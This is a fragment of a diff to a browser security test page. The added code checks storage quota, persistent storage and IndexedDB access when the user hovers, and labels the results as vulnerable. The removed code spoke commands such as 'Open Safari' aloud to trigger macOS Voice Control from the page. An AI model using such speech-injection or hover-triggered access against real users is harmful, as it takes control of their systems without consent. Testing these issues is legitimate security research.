+                    tests.push(`🚨 Storage estimate: ${(estimate.usage / 1024 / 1024).toFixed(2)} MB used / ${(estimate.quota / 1024 / 1024).toFixed(2)} MB total`);
+                } catch (error) {
+                    tests.push(`✅ Storage estimate failed: ${error.message}`);
+                }
+            }
+            
+            // Test Persistent Storage
+            if ('storage' in navigator && 'persist' in navigator.storage) {
+                try {
+                    const isPersisted = await navigator.storage.persist();
+                    tests.push(`🚨 Persistent storage: ${isPersisted ? 'Granted' : 'Denied'}`);
+                } catch (error) {
+                    tests.push(`✅ Persistent storage failed: ${error.message}`);
+                }
+            }
+            
+            // Test IndexedDB
+            try {
+                const db = await new Promise((resolve, reject) => {
+                    const request = indexedDB.open('HoverTestDB', 1);
+                    request.onerror = () => reject(request.error);
+                    request.onsuccess = () => resolve(request.result);
+                    request.onupgradeneeded = (event) => {
+                        const db = event.target.result;
+                        db.createObjectStore('hover-data', { keyPath: 'id' });
+                    };
+                });
+                tests.push("🚨 IndexedDB accessed via hover");
+                db.close();
+            } catch (error) {
+                tests.push(`✅ IndexedDB access: ${error.message}`);
+            }
+            
+            result.innerHTML = `
+                <div class="vulnerable">
+                    ${tests.join('<br>')}
+                </div>
             `;
-            
-            updateStatus(instructions, 'warning');
-            
-            // Speak the instructions
-            const utterance = new SpeechSynthesisUtterance(
-                "Please enable Voice Control in System Preferences under Accessibility. Then hover over commands to control your Mac."
-            );
-            speechSynthesis.speak(utterance);
         }
-
-        function isVoiceControlEnabled() {
-            // This is a simulation - in reality, we can't detect Voice Control status from browser
-            return false; // Assume not enabled until user confirms
-        }
-
-        function testAllCommands() {
-            updateStatus('🧪 Testing all voice commands sequentially...', 'info');
-            
-            const testCommands = [
-                'Open Safari',
-                'Show Desktop', 
-                'Open Finder',
-                'Volume Up',
-                'Click Safari',
-                'Show Numbers'
-            ];
-            
-            testCommands.forEach((command, index) => {
-                setTimeout(() => {
-                    speakCommand(command);
-                }, index * 3000); // 3 seconds between commands
-            });
-        }
-
-        function stopSpeaking() {
-            if (speechSynthesis.speaking) {
-                speechSynthesis.cancel();
-                isSpeaking = false;
-                const indicator = document.getElementById('voiceIndicator');
-                indicator.classList.remove('speaking', 'siri-speaking', 'siri');
-                updateStatus('⏹️ Speech stopped', 'warning');
-            }
-        }
-
-        // Preload voices and initialize
-        document.addEventListener('DOMContentLoaded', function() {
-            // Load available voices
-            speechSynthesis.onvoiceschanged = function() {
-                const voices = speechSynthesis.getVoices();
-                console.log('Available voices:', voices.length);
-                updateStatus(`✅ Voice system ready with ${voices.length} voices`, 'success');
-            };
-
-            // Force voices to load
-            if (speechSynthesis.getVoices().length > 0) {
-                updateStatus(`✅ Voice system ready with ${speechSynthesis.getVoices().length} voices`, 'success');
-            }
-
-            // Auto-enable instructions on page load
-            setTimeout(enableVoiceControl, 1000);
-
-            // Allow Enter key to trigger custom Siri command
-            document.getElementById('customCommand').addEventListener('keypress', function(e) {
-                if (e.key === 'Enter') {
-                    speakCustomSiriCommand();
-                }
-            });
-        });
     </script>
 </body>
 </html>
